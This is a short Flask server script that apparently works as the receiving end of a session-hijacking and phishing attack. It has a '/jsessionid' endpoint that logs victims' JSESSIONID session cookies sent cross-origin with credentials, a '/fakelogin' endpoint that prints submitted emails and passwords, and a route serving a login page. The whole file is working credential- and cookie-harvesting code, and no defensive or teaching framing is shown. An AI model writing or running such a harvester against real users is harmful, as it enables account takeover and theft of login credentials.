from datetime import datetime
from flask import Flask, Response, request, render_template
from flask_cors import CORS, cross_origin

app = Flask(__name__)
cors = CORS(app, resources={r'/*': {'origins': '*'}}, CORS_SUPPORTS_CREDENTIALS=True)
app.config['CORS_HEADERS'] = 'Content-Type'


@cross_origin
@app.route('/jsessionid', methods=['POST'])
def jsessionid():
    date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    # Get the JSESSIONID cookie from the request
    sessionid = request.cookies.get('JSESSIONID')
    print(f"{date} - JSESSIONID: {sessionid}")

    response = Response(f"JSSESSIONID: {sessionid}")
    response.headers['Access-Control-Allow-Origin'] = 'http://localhost:8888'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response


@app.route('/fakelogin', methods=['POST'])
def fakelogin():
    email = request.get_json()['email']
    password = request.get_json()['password']

    print(f"Email: {email} - Password: {password}")
    return "OK"


@app.route('/login', methods=['GET'])
def login():
    return render_template('login.html')


if __name__ == "__main__":
    app.run()
